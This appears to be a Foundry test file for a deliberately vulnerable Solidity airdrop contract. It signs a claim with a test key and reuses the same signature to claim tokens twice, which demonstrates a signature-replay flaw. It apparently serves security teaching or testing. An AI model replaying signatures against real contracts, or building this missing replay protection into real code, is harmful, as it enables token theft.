// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "../src/VulnerableAirdrop.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract ERC20Mock is ERC20 {
    constructor(
        string memory name,
        string memory symbol,
        address initialAccount,
        uint256 initialBalance
    ) ERC20(name, symbol) {
        _mint(initialAccount, initialBalance);
    }
}

contract VulnerableAirdropTest is Test {
    using ECDSA for bytes32;

    ERC20Mock token;
    VulnerableAirdrop airdrop;
    address signer;
    address user;

    function setUp() public {
        signer = vm.addr(1);
        user = vm.addr(2);

        token = new ERC20Mock("Test Token", "TST", address(this), 10000 ether);
        airdrop = new VulnerableAirdrop(address(token), signer);

        token.transfer(address(airdrop), 1000 ether);
    }

    function testExploitSignatureReplay() public {
        uint256 amount = 100 ether;
        bytes32 messageHash = keccak256(abi.encodePacked(
            "\x19Ethereum Signed Message:\n32", 
            keccak256(abi.encodePacked(user, amount))
        ));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, messageHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // First claim
        vm.prank(user);
        airdrop.claimTokens(amount, signature);
        assertEq(token.balanceOf(user), amount);

        // Reuse the same signature to claim again
        vm.prank(user);
        airdrop.claimTokens(amount, signature);
        assertEq(token.balanceOf(user), 2 * amount);
    }
}
